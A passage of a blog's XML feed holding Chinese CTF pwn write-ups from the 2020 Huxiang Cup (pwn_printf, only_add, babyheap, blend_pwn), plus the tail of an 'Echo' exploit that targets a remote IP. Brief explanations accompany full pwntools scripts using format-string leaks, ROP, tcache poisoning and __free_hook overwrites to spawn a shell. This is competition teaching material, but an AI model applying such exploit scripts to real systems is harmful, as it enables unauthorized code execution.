class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./Echo"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./Echo"</span>).libc</span><br><span class="line">p = remote(<span class="string">'121.36.216.253'</span>,<span class="number">10001</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(name)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Choice &gt;&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"User name:"</span>)</span><br><span class="line">p.send(name)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span><span class="params">(size,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Choice &gt;&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Input size:"</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.sendline(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo2</span><span class="params">(data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Choice &gt;&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Input size:"</span>)</span><br><span class="line">p.send(data)</span><br><span class="line">p.sendline(<span class="string">''</span>) </span><br><span class="line">one = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line"><span class="comment">#leak</span></span><br><span class="line">echo(<span class="number">7</span>,<span class="string">'%21$p'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"say:0x"</span>)</span><br><span class="line">libc.address = int(p.recv(<span class="number">12</span>),<span class="number">16</span>) <span class="number">-0x20840</span></span><br><span class="line"><span class="keyword">print</span> hex(libc.address)</span><br><span class="line">echo(<span class="number">7</span>,<span class="string">'%19$p'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"say:0x"</span>)</span><br><span class="line">canary = int(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> hex(canary)</span><br><span class="line">echo(<span class="number">7</span>,<span class="string">'%15$p'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"say:0x"</span>)</span><br><span class="line">pie = int(p.recv(<span class="number">12</span>),<span class="number">16</span>)<span class="number">-0x1107</span></span><br><span class="line"><span class="keyword">print</span> hex(pie)</span><br><span class="line">echo(<span class="number">7</span>,<span class="string">'%18$p'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"say:0x"</span>)</span><br><span class="line">stack = int(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> hex(stack)</span><br><span class="line"></span><br><span class="line">main_ret=stack<span class="number">-0xD8</span></span><br><span class="line">libc_base = libc.address</span><br><span class="line">system_addr = libc.sym[<span class="string">'system'</span>]</span><br><span class="line">binsh_addr = libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">_IO_2_1_stdin_addr = libc.sym[<span class="string">'_IO_2_1_stdin_'</span>]</span><br><span class="line">_IO_buf_base = _IO_2_1_stdin_addr + <span class="number">0x8</span> * <span class="number">7</span></span><br><span class="line">pop_rdi = pie + <span class="number">0x11b3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">login(p64(_IO_buf_base)[:<span class="number">-1</span>])</span><br><span class="line"><span class="comment">#gdb.attach(p,'b *$rebase(0x106D)\n b *$rebase(0x1044)')</span></span><br><span class="line">echo(<span class="number">7</span>,<span class="string">'%16$hhn'</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0x83</span> + _IO_2_1_stdin_addr)*<span class="number">3</span> + p64(main_ret) + p64(main_ret + <span class="number">0x8</span> * <span class="number">3</span>)</span><br><span class="line">echo2(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(payload)<span class="number">-1</span>):</span><br><span class="line">p.recvuntil(<span class="string">"Choice &gt;&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Input size:"</span>)</span><br><span class="line">p.sendline(<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line">echo2(payload)</span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line">p.recvuntil(<span class="string">"Choice &gt;&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;PWN&quot;&gt;&lt;a href=&quot;#PWN&quot; class=&quot;headerlink&quot; title=&quot;PWN&quot;&gt;&lt;/a&gt;PWN&lt;/h2&gt;&lt;h3 id=&quot;noteplus&quot;&gt;&lt;a href=&quot;#noteplus&quot; class=&quot;headerlink&quot; title=&quot;notep
      
    
    </summary>
    
    
      <category term="WP" scheme="https://nuoye-blog.github.io/categories/WP/"/>
    
    
      <category term="ctf" scheme="https://nuoye-blog.github.io/tags/ctf/"/>
    
      <category term="WP" scheme="https://nuoye-blog.github.io/tags/WP/"/>
    
      <category term="PWN" scheme="https://nuoye-blog.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>2020湖湘杯pwn-WP</title>
    <link href="https://nuoye-blog.github.io/2020/11/03/c0045b88/"/>
    <id>https://nuoye-blog.github.io/2020/11/03/c0045b88/</id>
    <published>2020-11-03T09:00:00.000Z</published>
    <updated>2021-01-01T15:10:38.059Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="pwn-printf"><a href="#pwn-printf" class="headerlink" title="pwn_printf"></a>pwn_printf</h3><p>首先输入0x10个size(0x20)，即可实现栈溢出。然后就是简单的rop和getshell，脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./pwn_printf"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./pwn_printf"</span>).libc</span><br><span class="line">p.recvuntil(<span class="string">"You will find this game very interesting\n"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x4007DF')</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">p.sendline(str(<span class="number">0x20</span>))</span><br><span class="line">puts_plt = <span class="number">0x400640</span></span><br><span class="line">puts_got = <span class="number">0x603018</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000401213</span></span><br><span class="line">p.send(p64(<span class="number">0x603500</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(<span class="number">0x4007DF</span>))</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>) - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"><span class="comment">#p.send("a"*0x8+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(0x4007C6))</span></span><br><span class="line">p.sendline(<span class="string">"a"</span>*<span class="number">0x8</span>+p64(pop_rdi)+p64(libc_base+libc.search(<span class="string">"/bin/sh"</span>).next())+p64(libc_base+libc.sym[<span class="string">'system'</span>]))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="only-add"><a href="#only-add" class="headerlink" title="only_add"></a>only_add</h3><p>只有add功能，但是用的是realloc函数，size为0时即为free。</p><p>另外输入的时候可以off by one，修改size位可在下次申请到的时候溢出该堆块。</p><p>首先构造出unsortbin，并且利用off by one漏洞溢出修改其fd为<code>_IO_2_1_stdout_</code>，然后继续改另一tcache堆块fd到这里。</p><p>注意这里可以用realloc将堆块分割避免放入原来的tcache中，利用该方法进行io_leak，得到libc地址。</p><p>接着用close(1)处的逻辑将堆块指针置0，然后再次进行realloc，劫持某一tcache的fd到<code>__free_hook</code>，并修改其为system即可getshell。</p><p>getshell后需要用<code>sh &gt;&amp;2</code>恢复回显。整个脚本的概率是1/256：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.timeout = <span class="number">1</span></span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">p = process(<span class="string">"./pwn"</span>,env =&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc.so.6"</span>&#125;)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"choice:"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Size:"</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">"Data:"</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"choice:"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Size:"</span>)</span><br><span class="line">p.sendline(str(<span class="number">0</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">close_io</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"choice:"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add2</span><span class="params">(size,data)</span>:</span></span><br><span class="line">p.send(<span class="string">"0000000000000001"</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(data)</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free2</span><span class="params">()</span>:</span></span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">'0'</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xb8</span>,<span class="string">'a'</span>)</span><br><span class="line">free()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">add(<span class="number">0x118</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">0x88</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">0x1d8</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">0x88</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">0x1f8</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">'a'</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">0x1b8</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">0x48</span>,<span class="string">'a'</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">0x168</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">'a'</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">0x138</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">0x88</span>,<span class="string">'a'</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">0x48</span>,<span class="string">'\x00'</span>*<span class="number">0x48</span>+<span class="string">'\xc0'</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">'a'</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">0xb8</span>,<span class="string">'\x00'</span>*<span class="number">0x28</span>+p64(<span class="number">0x101</span>)+<span class="string">'\x60\xe7'</span>)</span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">'\x00'</span>*<span class="number">0x38</span>+<span class="string">'\xe0'</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">0x48</span>,<span class="string">'a'</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">0xd8</span>,<span class="string">'\x00'</span>*<span class="number">0x48</span>+p64(<span class="number">0x51</span>)+<span class="string">'\x20\x79'</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">0xb8</span>,<span class="string">'a'</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">0xb8</span>,<span class="string">'a'</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">0xb8</span>,p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x00'</span>)</span><br><span class="line">p.recvuntil(p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x3EC700</span></span><br><span class="line"><span class="keyword">print</span> hex(libc.address)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (libc.address&amp;<span class="number">0xfff</span>==<span class="number">0</span>):</span><br><span class="line">close_io()</span><br><span class="line">add2(<span class="number">0x48</span>,<span class="string">'\x00'</span>*<span class="number">0x28</span>+p64(<span class="number">0x141</span>)+p64(libc.sym[<span class="string">'__free_hook'</span>]<span class="number">-8</span>))<span class="comment">#0x555555757710</span></span><br><span class="line">free2()</span><br><span class="line">add2(<span class="number">0xf8</span>,<span class="string">'a'</span>)</span><br><span class="line">free2()</span><br><span class="line">add2(<span class="number">0xf8</span>,<span class="string">'/bin/sh\x00'</span>+p64(libc.sym[<span class="string">'system'</span>]))</span><br><span class="line"><span class="comment">#gdb.attach(p,'b realloc\n b free')</span></span><br><span class="line">free2()</span><br><span class="line">p.sendline(<span class="string">"sh &gt;&amp;2"</span>)</span><br><span class="line">p.sendline(<span class="string">"cat flag"</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">i += <span class="number">1</span></span><br><span class="line"><span class="keyword">print</span> i</span><br><span class="line">exp()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'fail'</span></span><br></pre></td></tr></table></figure><h3 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h3><p>show和del函数未正确检查index。</p><p>首先用<code>show(-7)</code>leak出pie地址。</p><p>接着填满tcache，leak出libc地址和堆地址。</p><p>然后在堆上伪造出size为0x100的堆块，并用del函数进行free，然后劫持其fd指针修改为<code>__free_hook</code>，并改为system函数地址，执行/bin/sh即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.timeout = 1</span></span><br><span class="line">p = process(<span class="string">"./babyheap"</span>,env =&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc.so.6"</span>&#125;)</span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"index?"</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,size,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"index?"</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">"Size:"</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">"Content:"</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"4"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"index?"</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">show(<span class="number">-7</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">pie = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)<span class="number">-0x202008</span></span><br><span class="line"><span class="keyword">print</span> hex(pie)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">add()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">free(<span class="number">7</span>-i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">add()</span><br><span class="line">edit(<span class="number">7</span>,<span class="number">0x20</span>,<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">p.recvuntil(<span class="string">"a"</span>*<span class="number">8</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)<span class="number">-0x3EBCA0</span></span><br><span class="line"><span class="keyword">print</span> hex(libc.address)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">heap = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)</span><br><span class="line"><span class="keyword">print</span> hex(heap)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x88</span>,p64(heap<span class="number">-0xD0</span>)*<span class="number">5</span>+p64(<span class="number">0x101</span>))</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x88</span>,p64(<span class="number">0</span>)*<span class="number">5</span>+p64(<span class="number">0x101</span>))</span><br><span class="line">free(( heap - <span class="number">0xe0</span> - (pie+<span class="number">0x202040</span>) )/<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x88</span>,p64(heap<span class="number">-0xD0</span>)*<span class="number">5</span>+p64(<span class="number">0x101</span>)+p64(libc.sym[<span class="string">'__free_hook'</span>]))</span><br><span class="line">add()</span><br><span class="line">add()</span><br><span class="line">edit(<span class="number">9</span>,<span class="number">9</span>,p64(libc.sym[<span class="string">'system'</span>]))</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">8</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b free')</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="blend-pwn"><a href="#blend-pwn" class="headerlink" title="blend_pwn"></a>blend_pwn</h3><p>这道是赛后才做出来的，前面是简单的用堆来进行leak操作，后面主要卡在c++的异常化处理上。</p><p>最后看了Lime师傅的脚本才知道最后输入的栈指针后需要跟上一个字符才能过。具体payload如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./blend_pwn"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./blend_pwn"</span>).libc</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Enter your choice &gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"input note:"</span>)</span><br><span class="line">p.sendline(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Enter your choice &gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"index&gt;"</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Enter your choice &gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"4"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_name</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Enter your choice &gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backdoor</span><span class="params">(data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Enter your choice &gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"666"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Please input what you want:"</span>)</span><br><span class="line">p.send(data)</span><br><span class="line">one = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">p.recvuntil(<span class="string">"Please enter a name: "</span>)</span><br><span class="line">p.sendline(<span class="string">"%2$p"</span>)</span><br><span class="line"></span><br><span class="line">show_name()</span><br><span class="line">p.recvuntil(<span class="string">"user:0x"</span>)</span><br><span class="line">libc.address = int(p.recv(<span class="number">12</span>),<span class="number">16</span>)<span class="number">-0x6CF780</span>+<span class="number">0x309000</span></span><br><span class="line"><span class="keyword">print</span> hex(libc.address)</span><br><span class="line">addr = libc.address+<span class="number">0x3C6F38</span></span><br><span class="line">add(p64(<span class="number">0</span>)*<span class="number">3</span>+p64(libc.address+one[<span class="number">0</span>]))</span><br><span class="line"><span class="keyword">print</span> hex(addr)</span><br><span class="line">add(<span class="string">"111"</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">"index 2:"</span>)</span><br><span class="line">heap = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)</span><br><span class="line"><span class="keyword">print</span> hex(heap)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b *$rebase(0x11B8)')</span></span><br><span class="line">backdoor(p64(<span class="number">0</span>)*<span class="number">4</span>+p64(heap+<span class="number">0x20</span>)+<span class="string">'a'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;PWN&quot;&gt;&lt;a href=&quot;#PWN&quot; class=&quot;headerlink&quot; title=&quot;PWN&quot;&gt;&lt;/a&gt;PWN&lt;/h2&gt;&lt;h3 id=&quot;pwn-printf&quot;&gt;&lt;a href=&quot;#pwn-printf&quot; class=&quot;headerlink&quot; title=&quot;p
      
    
    </summary>
    
    
      <category term="WP" scheme="https://nuoye-blog.github.io/categories/WP/"/>
    
    
      <category term="ctf" scheme="https://nuoye-blog.github.io/tags/ctf/"/>
    
      <category term="WP" scheme="https://nuoye-blog.github.io/tags/WP/"/>
    
      <category term="PWN" scheme="https://nuoye-blog.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>2020 xnuca 部分pwn WP（待更新）</title>
    <link href="https://nuoye-blog.github.io/2020/11/03/39b66ce6/"/>
    <id>https://nuoye-blog.github.io/2020/11/03/39b66ce6/</id>
    <published>2020-11-03T09:00:00.000Z</published>
